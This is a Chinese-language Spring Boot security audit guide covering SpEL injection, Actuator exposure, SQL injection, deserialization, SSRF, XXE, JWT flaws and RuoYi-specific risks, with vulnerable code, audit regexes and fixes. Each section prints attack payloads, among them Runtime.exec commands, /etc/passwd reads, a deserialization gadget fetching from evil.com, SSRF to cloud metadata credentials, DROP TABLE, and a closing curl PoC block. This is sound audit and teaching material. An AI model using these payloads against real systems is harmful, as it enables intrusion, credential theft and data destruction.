# Spring Boot Security Audit Guide

> Spring Framework 和 Spring Boot 安全审计模块
> 适用于: Spring Boot 2.x/3.x, Spring MVC, Spring Security, Spring Data

## 核心危险面

Spring 框架强大的依赖注入和面向切面特性带来独特的攻击面：SpEL表达式注入、反序列化、Spring Cloud 网关漏洞、Actuator 暴露、SQL/HQL注入等。

---

## SpEL 表达式注入检测

```java
// 高危函数和注解
@Value("#{user.input}")              // ❌ SpEL表达式注入
parser.parseExpression(userInput)    // ❌ 直接解析用户输入
new SpelExpressionParser()           // 注意其使用场景

// 常见漏洞场景
@RequestMapping("/user")
public String getUser(@RequestParam String name) {
    ExpressionParser parser = new SpelExpressionParser();
    Expression exp = parser.parseExpression(name);  // ❌ Critical: SpEL注入
    return exp.getValue().toString();
}

// 攻击载荷
GET /user?name=T(java.lang.Runtime).getRuntime().exec("calc")
GET /user?name=new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\Z").next()

// 审计正则
@Value\s*\(.*#\{.*\}.*\)|SpelExpressionParser|parseExpression\s*\(
StandardEvaluationContext

// 安全修复
// 使用 SimpleEvaluationContext (受限上下文)
ExpressionParser parser = new SpelExpressionParser();
SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
Expression exp = parser.parseExpression(safeExpression);
Object value = exp.getValue(context);  // ✓ 无法执行危险操作

// 或完全避免动态SpEL
@Value("${app.static.config}")  // ✓ 使用属性占位符而非SpEL
```

---

## Spring Cloud Gateway 漏洞

```yaml
# CVE-2022-22947 - Spring Cloud Gateway Actuator 远程代码执行
# 危险配置
management:
  endpoint:
    gateway:
      enabled: true  # ❌ 启用网关actuator

spring:
  cloud:
    gateway:
      actuator:
        verbose:
          enabled: true  # ❌ 详细模式

# 攻击向量
POST /actuator/gateway/routes/test HTTP/1.1
Content-Type: application/json

{
  "id": "test",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{T(java.lang.Runtime).getRuntime().exec('calc')}"
    }
  }],
  "uri": "http://example.com"
}

# 安全配置
management:
  endpoints:
    web:
      exposure:
        exclude: gateway  # ✓ 禁用gateway端点
  endpoint:
    gateway:
      enabled: false      # ✓ 明确禁用
```

---

## Spring Actuator 信息泄露

```yaml
# 危险配置
management:
  endpoints:
    web:
      exposure:
        include: "*"     # ❌ 暴露所有端点
  endpoint:
    env:
      show-values: ALWAYS  # ❌ 显示敏感环境变量

# 危险端点清单
/actuator/env            # 环境变量 (含密码)
/actuator/heapdump       # 堆转储 (含内存中的密钥)
/actuator/trace          # HTTP跟踪 (含请求参数)
/actuator/mappings       # 路由映射
/actuator/beans          # Bean配置
/actuator/configprops    # 配置属性

# 审计检查
grep -r "management.endpoints.web.exposure.include" .
grep -r "management.security.enabled.*false" .

# 安全配置
management:
  endpoints:
    web:
      exposure:
        include: health,info  # ✓ 仅暴露必要端点
      base-path: /internal/actuator  # ✓ 自定义路径
  endpoint:
    env:
      show-values: WHEN_AUTHORIZED  # ✓ 需要认证
  server:
    port: 8081  # ✓ 使用独立端口

# 添加安全认证
@Configuration
public class ActuatorSecurity extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.requestMatcher(EndpointRequest.toAnyEndpoint())
            .authorizeRequests()
            .anyRequest().hasRole("ACTUATOR_ADMIN");  // ✓
    }
}
```

---

## SQL/HQL 注入检测

```java
// 危险操作 - JPA
@Query(value = "SELECT * FROM users WHERE name = " + name)  // ❌ Critical
List<User> findByName(String name);

// 危险操作 - EntityManager
String query = "SELECT u FROM User u WHERE name = '" + name + "'";
entityManager.createQuery(query);  // ❌ Critical: HQL注入

// 危险操作 - JdbcTemplate
jdbcTemplate.query("SELECT * FROM users WHERE id = " + id);  // ❌ Critical

// 审计正则
@Query.*\+\s*[a-zA-Z]|createQuery\s*\(.*\+|jdbcTemplate\.(query|update).*\+
String.*=.*"SELECT.*\+

// 漏洞示例
@GetMapping("/user")
public User getUser(@RequestParam String id) {
    String sql = "SELECT * FROM users WHERE id = " + id;
    return jdbcTemplate.queryForObject(sql, User.class);  // ❌
}

// 攻击载荷
GET /user?id=1' OR '1'='1
GET /user?id=1; DROP TABLE users--

// 安全修复 - 参数化查询
@Query("SELECT u FROM User u WHERE name = :name")  // ✓
List<User> findByName(@Param("name") String name);

// EntityManager 参数化
TypedQuery<User> query = entityManager.createQuery(
    "SELECT u FROM User u WHERE name = :name", User.class);
query.setParameter("name", name);  // ✓

// JdbcTemplate 参数化
jdbcTemplate.query(
    "SELECT * FROM users WHERE id = ?",
    new Object[]{id},
    new BeanPropertyRowMapper<>(User.class)
);  // ✓
```

---

## 不安全的反序列化

```java
// 危险库和配置
Jackson:
enableDefaultTyping()                // ❌ 危险配置
@JsonTypeInfo(use = Id.CLASS)        // ❌ 允许任意类

XStream:
new XStream()                        // ❌ 无白名单
xstream.fromXML(userInput)           // ❌

// 审计正则
enableDefaultTyping|@JsonTypeInfo.*Id\.CLASS|new\s+XStream\s*\(\)
readObject\s*\(|ObjectInputStream

// 漏洞示例 - Jackson
@PostMapping("/user")
public User createUser(@RequestBody String json) {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();  // ❌ Critical: 多态类型处理
    return mapper.readValue(json, User.class);
}

// 攻击载荷
["org.springframework.context.support.ClassPathXmlApplicationContext",
 "http://evil.com/malicious.xml"]

// 安全修复
ObjectMapper mapper = new ObjectMapper();
// 不要启用 enableDefaultTyping
mapper.readValue(json, User.class);  // ✓

// 如果必须支持多态，使用白名单
ObjectMapper mapper = new ObjectMapper();
PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
    .allowIfSubType("com.example.safepackage")  // ✓ 白名单包
    .build();
mapper.activateDefaultTyping(ptv, DefaultTyping.NON_FINAL);
```

---

## 不安全的文件上传

```java
// 危险操作
@PostMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) {
    String filename = file.getOriginalFilename();
    file.transferTo(new File("/uploads/" + filename));  // ❌ High: 路径遍历
}

// 攻击载荷
POST /upload
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../../evil.jsp"

// 审计正则
getOriginalFilename\(\).*transferTo|FileCopyUtils\.copy.*getOriginalFilename

// 安全修复
@PostMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) {
    String filename = file.getOriginalFilename();

    // 1. 文件名验证
    if (filename == null || filename.contains("..") || filename.contains("/")) {
        throw new IllegalArgumentException("Invalid filename");
    }

    // 2. 扩展名白名单
    String ext = FilenameUtils.getExtension(filename);
    if (!Arrays.asList("jpg", "png", "pdf").contains(ext.toLowerCase())) {
        throw new IllegalArgumentException("Invalid file type");
    }

    // 3. 使用随机文件名
    String safeFilename = UUID.randomUUID().toString() + "." + ext;
    Path targetPath = Paths.get("/uploads").resolve(safeFilename);

    // 4. 验证路径
    if (!targetPath.normalize().startsWith("/uploads")) {
        throw new IllegalArgumentException("Invalid path");
    }

    // 5. 文件大小限制
    if (file.getSize() > 10 * 1024 * 1024) {  // 10MB
        throw new IllegalArgumentException("File too large");
    }

    file.transferTo(targetPath.toFile());  // ✓
}

// application.yml 配置
spring:
  servlet:
    multipart:
      max-file-size: 10MB
      max-request-size: 10MB
```

---

## SSRF 检测

```java
// 危险操作
RestTemplate restTemplate = new RestTemplate();
String url = request.getParameter("url");
String response = restTemplate.getForObject(url, String.class);  // ❌ High: SSRF

// 审计正则
RestTemplate|WebClient|HttpClient.*getParameter|getQueryString
getForObject.*request\.|exchange.*request\.

// 漏洞示例
@GetMapping("/fetch")
public String fetchUrl(@RequestParam String url) {
    RestTemplate restTemplate = new RestTemplate();
    return restTemplate.getForObject(url, String.class);  // ❌
}

// 攻击载荷
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET /fetch?url=http://localhost:8080/actuator/env
GET /fetch?url=file:///etc/passwd

// 安全修复
private static final Set<String> ALLOWED_HOSTS = Set.of(
    "api.example.com",
    "cdn.example.com"
);

@GetMapping("/fetch")
public String fetchUrl(@RequestParam String url) throws Exception {
    URI uri = new URI(url);

    // 1. 协议白名单
    if (!uri.getScheme().equals("https")) {
        throw new IllegalArgumentException("Only HTTPS allowed");
    }

    // 2. 主机白名单
    if (!ALLOWED_HOSTS.contains(uri.getHost())) {
        throw new IllegalArgumentException("Host not allowed");
    }

    // 3. 禁止内网IP
    InetAddress addr = InetAddress.getByName(uri.getHost());
    if (addr.isSiteLocalAddress() || addr.isLoopbackAddress()) {
        throw new IllegalArgumentException("Internal IP not allowed");
    }

    RestTemplate restTemplate = new RestTemplate();
    return restTemplate.getForObject(uri, String.class);  // ✓
}
```

---

## 不安全的 CORS 配置

```java
// 危险配置
@Configuration
public class CorsConfig {
    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/**")
                    .allowedOrigins("*")  // ❌ High: 允许所有域
                    .allowCredentials(true);  // ❌ 与通配符冲突
            }
        };
    }
}

// 审计正则
allowedOrigins.*\*|setAllowedOrigins.*\*|allowedOriginPatterns.*\*
allowCredentials.*true

// 安全修复
@Configuration
public class CorsConfig {
    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/api/**")
                    .allowedOrigins("https://app.example.com")  // ✓ 明确域名
                    .allowedMethods("GET", "POST")
                    .allowedHeaders("Content-Type", "Authorization")
                    .allowCredentials(true)
                    .maxAge(3600);
            }
        };
    }
}

// 动态验证Origin
@Override
public void addCorsMappings(CorsRegistry registry) {
    registry.addMapping("/api/**")
        .allowedOriginPatterns(
            "https://*.example.com",  // ✓ 子域名模式
            "https://example.com"
        )
        .allowCredentials(true);
}
```

---

## 认证和授权绕过

```java
// 危险配置 - permitAll 滥用
@Configuration
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.authorizeRequests()
            .antMatchers("/**").permitAll();  // ❌ Critical: 所有路径无需认证
    }
}

// 危险配置 - CSRF 禁用
http.csrf().disable();  // ❌ Medium: 除非API仅供非浏览器客户端

// 危险配置 - 注解绕过
@PreAuthorize("true")  // ❌ 无意义的授权检查
@PreAuthorize("hasRole('" + userRole + "')")  // ❌ 字符串拼接可能注入

// 审计正则
permitAll\(\)|csrf\(\)\.disable|@PreAuthorize.*\+

// 漏洞示例
@GetMapping("/admin")
@PreAuthorize("hasRole('ADMIN')")
public String admin() {
    return "Admin panel";
}

@GetMapping("/admin/bypass")  // ❌ 忘记添加授权注解
public String adminBypass() {
    return "Admin panel without auth";
}

// 安全修复
@Configuration
@EnableGlobalMethodSecurity(prePostEnabled = true)
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .authorizeRequests()
                .antMatchers("/public/**").permitAll()  // ✓ 明确公开路径
                .antMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()  // ✓ 默认需认证
            .and()
            .formLogin()
            .and()
            .csrf()  // ✓ 启用CSRF保护
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
    }
}

// 使用方法级安全
@PreAuthorize("hasRole('ADMIN')")  // ✓ 静态角色
@PreAuthorize("@authService.canAccess(#id)")  // ✓ 自定义逻辑
```

---

## Path Traversal in ResourceHttpRequestHandler

```java
// CVE-2018-1271 - Spring MVC 路径遍历
// 危险配置
@Configuration
public class WebConfig implements WebMvcConfigurer {
    @Override
    public void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry.addResourceHandler("/files/**")
            .addResourceLocations("file:/var/www/uploads/");  // ❌ 可能路径遍历
    }
}

// 攻击载荷
GET /files/..%252F..%252Fetc%252Fpasswd

// 审计正则
addResourceLocations.*file:|addResourceHandler.*\*\*

// 安全措施
// 1. 升级到安全版本 (Spring 5.0.5+ / 4.3.15+)
// 2. 避免 file: 协议
registry.addResourceHandler("/static/**")
    .addResourceLocations("classpath:/static/");  // ✓ 使用classpath
```

---

## XXE 漏洞检测

```java
// 危险操作
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(userInputStream);  // ❌ High: XXE

SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser parser = spf.newSAXParser();  // ❌ 默认不安全

// 审计正则
DocumentBuilderFactory\.newInstance|SAXParserFactory\.newInstance|XMLInputFactory\.newInstance
setFeature.*FEATURE_SECURE_PROCESSING

// 攻击载荷
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

// 安全修复
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
// 禁用DTD
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// 禁用外部实体
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
// 禁用外部DTD
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(userInputStream);  // ✓
```

---

## 开放重定向检测

```java
// 危险操作
@GetMapping("/redirect")
public String redirect(@RequestParam String url) {
    return "redirect:" + url;  // ❌ Medium: 开放重定向
}

@GetMapping("/forward")
public ModelAndView forward(@RequestParam String page) {
    return new ModelAndView("forward:" + page);  // ❌ Medium
}

// 审计正则
return\s+"redirect:".*request\.|ModelAndView.*"forward:".*request\.

// 攻击载荷
GET /redirect?url=https://evil.com/phishing

// 安全修复
private static final Set<String> ALLOWED_REDIRECTS = Set.of(
    "/home", "/dashboard", "/profile"
);

@GetMapping("/redirect")
public String redirect(@RequestParam String url) {
    // 仅允许相对路径
    if (!url.startsWith("/") || url.startsWith("//")) {
        throw new IllegalArgumentException("Invalid redirect URL");
    }

    // 白名单检查
    if (!ALLOWED_REDIRECTS.contains(url)) {
        return "redirect:/home";  // 默认安全页面
    }

    return "redirect:" + url;  // ✓
}

// 或验证域名
URI uri = new URI(url);
if (!"example.com".equals(uri.getHost())) {
    return "redirect:/";
}
```

---

## 敏感信息泄露

```java
// 危险操作
@ExceptionHandler(Exception.class)
public ResponseEntity<String> handleException(Exception e) {
    return ResponseEntity.status(500)
        .body(e.getMessage() + "\n" + e.getStackTrace());  // ❌ Medium: 堆栈泄露
}

// application.properties
spring.jpa.show-sql=true             // ❌ Low: SQL日志
logging.level.root=DEBUG             // ❌ Low: 调试日志
server.error.include-stacktrace=always  // ❌ Medium: 总是返回堆栈

// 审计正则
printStackTrace|getStackTrace|show-sql=true|include-stacktrace=always

// 安全修复
@ExceptionHandler(Exception.class)
public ResponseEntity<ErrorResponse> handleException(Exception e) {
    log.error("Error occurred", e);  // ✓ 后端记录详细错误

    ErrorResponse error = new ErrorResponse();
    error.setMessage("An error occurred");  // ✓ 通用错误消息
    error.setTimestamp(LocalDateTime.now());

    return ResponseEntity.status(500).body(error);
}

// application.properties (生产环境)
spring.jpa.show-sql=false
logging.level.root=WARN
server.error.include-stacktrace=never
server.error.include-message=never
```

---

## JWT 安全检测

```java
// 危险操作
String jwt = request.getHeader("Authorization");
Claims claims = Jwts.parser()
    .parse(jwt)  // ❌ High: 不验证签名
    .getBody();

// 弱密钥
String SECRET = "secret";  // ❌ Critical: 弱密钥

// none算法
Jwts.builder().setAlgorithm("none");  // ❌ Critical

// 审计正则
\.parse\((?!.*setSigningKey)|SECRET.*=.*"[^"]{1,16}"|setAlgorithm.*none

// 安全修复
@Value("${jwt.secret}")
private String jwtSecret;  // ✓ 从配置读取强密钥

public Claims validateToken(String token) {
    try {
        return Jwts.parser()
            .setSigningKey(jwtSecret.getBytes())  // ✓ 验证签名
            .parseClaimsJws(token)
            .getBody();
    } catch (JwtException e) {
        throw new UnauthorizedException("Invalid token");
    }
}

// 密钥要求
// application.properties
jwt.secret=${JWT_SECRET:}  // 从环境变量读取
# 密钥至少32字节随机字符串
```

---

## 搜索模式汇总

```regex
# SpEL注入
@Value.*#\{|SpelExpressionParser|parseExpression\(

# SQL/HQL注入
@Query.*\+|createQuery.*\+|jdbcTemplate\.(query|update).*\+

# 反序列化
enableDefaultTyping|@JsonTypeInfo.*Id\.CLASS|readObject

# 文件操作
getOriginalFilename|transferTo|FileCopyUtils

# SSRF
RestTemplate|WebClient.*getParameter|getForObject.*request

# Actuator
management\.endpoints.*include.*\*

# 认证授权
permitAll\(\)|csrf\(\)\.disable|@PreAuthorize.*\+

# XXE
DocumentBuilderFactory\.newInstance

# 敏感信息
printStackTrace|getStackTrace|show-sql=true

# 开放重定向
return.*"redirect:".*request|ModelAndView.*"forward:"
```

---

## 快速审计检查清单

```markdown
[ ] 检查 Spring Boot 版本和已知CVE
[ ] 搜索 SpelExpressionParser (SpEL注入)
[ ] 检查 Actuator 端点暴露配置
[ ] 检查 SQL/HQL 查询的字符串拼接
[ ] 搜索 enableDefaultTyping (反序列化)
[ ] 检查文件上传的路径处理
[ ] 检查 RestTemplate/WebClient SSRF
[ ] 检查 CORS 配置 (allowedOrigins)
[ ] 检查认证授权配置 (permitAll)
[ ] 检查 CSRF 是否合理禁用
[ ] 检查 JWT 验证逻辑
[ ] 检查异常处理是否泄露堆栈
[ ] 检查 XXE 防护配置
[ ] 检查开放重定向漏洞
[ ] 审计 application.properties 敏感配置
```

---

## 最小 PoC 示例
```bash
# SpEL/表达式注入
curl "http://localhost:8080/search?expr=T(java.lang.Runtime).getRuntime().exec('id')"

# SSRF
curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/"

# 路径遍历下载
curl "http://localhost:8080/common/download?fileName=../../../../etc/passwd"
```

---

## 参考资源

- [Spring Security Reference](https://docs.spring.io/spring-security/reference/)
- [Spring Boot CVE List](https://spring.io/security-advisories)
- [OWASP Spring Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Spring_Security_Cheat_Sheet.html)
- [Spring Cloud Gateway Vulnerabilities](https://tanzu.vmware.com/security)

---

## RuoYi 审计经验 (Spring Boot 实战)

> 基于 RuoYi 等实际项目的审计经验补充

### @DataScope 注解风险

```java
// 风险示例：数据范围过滤中的SQL注入
@DataScope(deptAlias = "d")
public List<User> selectUserList(User user) {
    return mapper.selectUserList(user); // 使用${params.dataScope}
}
```

**检测规则:**
```bash
grep -rn "@DataScope" --include="*.java"
grep -rn "\$\{" --include="*.xml"
```

### AOP 切面安全风险

```java
@Aspect
@Component
public class DataScopeAspect {
    // 风险：AOP切面中的SQL拼接
    baseEntity.getParams().put(DATA_SCOPE, " AND (" + sqlString.substring(4) + ")");
}
```

### 导出功能风险

```java
@PostMapping("/export")
public AjaxResult export(User user) {
    List<User> list = userService.selectUserList(user); // 间接调用数据过滤
    return util.exportExcel(list, "用户数据");
}
```

**审计清单补充:**
- [ ] @DataScope 注解驱动的 SQL 注入
- [ ] AOP 切面中的 SQL 拼接风险
- [ ] 导出功能的数据过滤漏洞
- [ ] 权限注解掩盖的安全风险
